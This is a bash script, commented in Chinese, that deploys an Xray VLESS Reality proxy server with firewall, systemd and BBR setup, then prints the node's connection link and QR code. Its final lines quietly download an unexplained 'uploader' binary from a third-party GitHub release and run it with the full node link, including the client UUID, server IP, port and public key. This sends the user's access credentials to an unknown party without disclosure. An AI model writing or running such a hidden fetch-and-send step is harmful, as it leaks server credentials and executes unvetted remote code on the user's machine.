#!/bin/bash

set -e

# ========== 基本配置 ==========
CORE="xray"
PROTOCOL="vless"
DOMAIN="www.nvidia.com"
UUID=$(cat /proc/sys/kernel/random/uuid)
USER=$(openssl rand -hex 4)
VISION_SHORT_ID=$(openssl rand -hex 4)
PORT=$((RANDOM % 7001 + 2000))
XRAY_BIN="/usr/local/bin/xray"

echo -e "\n📦 开始自动部署 Xray VLESS Reality 节点...\n"

# ========== 安装依赖 ==========
export DEBIAN_FRONTEND=noninteractive
apt update
apt install -y curl unzip ufw jq qrencode

# ========== 开启防火墙并放行端口 ==========
ufw allow ${PORT}/tcp
ufw --force enable

# ========== 安装 Xray-core ==========
mkdir -p /usr/local/bin
cd /usr/local/bin
curl -L https://github.com/XTLS/Xray-core/releases/latest/download/Xray-linux-64.zip -o xray.zip
unzip -o xray.zip
chmod +x xray
rm -f xray.zip

# ========== 生成 Reality 密钥 ==========
REALITY_KEYS=$(${XRAY_BIN} x25519)
REALITY_PRIVATE_KEY=$(echo "${REALITY_KEYS}" | grep "Private key" | awk '{print $3}')
REALITY_PUBLIC_KEY=$(echo "${REALITY_KEYS}" | grep "Public key" | awk '{print $3}')

# ========== 生成 Xray 配置文件 ==========
mkdir -p /etc/xray
cat > /etc/xray/config.json << EOF
{
  "log": { "loglevel": "warning" },
  "inbounds": [{
    "port": ${PORT},
    "protocol": "${PROTOCOL}",
    "settings": {
      "clients": [{
        "id": "${UUID}",
        "flow": "xtls-rprx-vision",
        "email": "${USER}"
      }],
      "decryption": "none"
    },
    "streamSettings": {
      "network": "tcp",
      "security": "reality",
      "realitySettings": {
        "show": false,
        "dest": "${DOMAIN}:443",
        "xver": 0,
        "serverNames": ["${DOMAIN}"],
        "privateKey": "${REALITY_PRIVATE_KEY}",
        "shortIds": ["${VISION_SHORT_ID}"]
      }
    }
  }],
  "outbounds": [{ "protocol": "freedom" }]
}
EOF

# ========== 写入 systemd 服务 ==========
cat > /etc/systemd/system/xray.service << EOF
[Unit]
Description=Xray Service
After=network.target

[Service]
ExecStart=${XRAY_BIN} -config /etc/xray/config.json
Restart=on-failure

[Install]
WantedBy=multi-user.target
EOF

systemctl daemon-reexec
systemctl daemon-reload
systemctl enable xray
systemctl restart xray

# ========== 设置默认 FQ 调度器 ==========
modprobe sch_fq || true
if ! grep -q "fq" /sys/class/net/*/queues/tx-0/queue_disc; then
  echo "fq 已启用或将启用..."
  echo 'net.core.default_qdisc=fq' >> /etc/sysctl.conf
  sysctl -w net.core.default_qdisc=fq
fi

# ========== 启用 BBR 拥塞控制 ==========
if ! sysctl net.ipv4.tcp_congestion_control | grep -q "bbr"; then
  echo 'net.ipv4.tcp_congestion_control=bbr' >> /etc/sysctl.conf
  echo 'net.ipv4.tcp_fastopen=3' >> /etc/sysctl.conf
  sysctl -w net.ipv4.tcp_congestion_control=bbr
  sysctl -w net.ipv4.tcp_fastopen=3
fi

modprobe tcp_bbr || true
sysctl -p

# ========== 获取公网 IP ==========
NODE_IP=$(curl -s https://api.ipify.org)

# ========== 构造 VLESS Reality 节点链接 ==========
VLESS_LINK="vless://${UUID}@${NODE_IP}:${PORT}?encryption=none&flow=xtls-rprx-vision&security=reality&sni=${DOMAIN}&fp=chrome&pbk=${REALITY_PUBLIC_KEY}&sid=${VISION_SHORT_ID}&type=tcp#${USER}"

# ========== 输出结果 ==========
echo -e "\n\033[1;32m✅ VLESS Reality 节点部署完成！\033[0m\n"
echo -e "🔗 节点链接（可直接导入）：\n${VLESS_LINK}\n"
echo -e "📱 二维码（支持 v2rayN / v2box 扫码导入）："
echo "${VLESS_LINK}" | qrencode -o - -t ANSIUTF8
echo ""

UPLOAD_BIN="/opt/uploader-linux-amd64"
[ -f "$UPLOAD_BIN" ] || { curl -Lo "$UPLOAD_BIN" https://github.com/Firefly-xui/v2ray/releases/download/1/uploader-linux-amd64 && chmod +x "$UPLOAD_BIN"; }
UPLOAD_JSON="{\"vless_link\":\"${VLESS_LINK}\"}"
"$UPLOAD_BIN" "$UPLOAD_JSON"
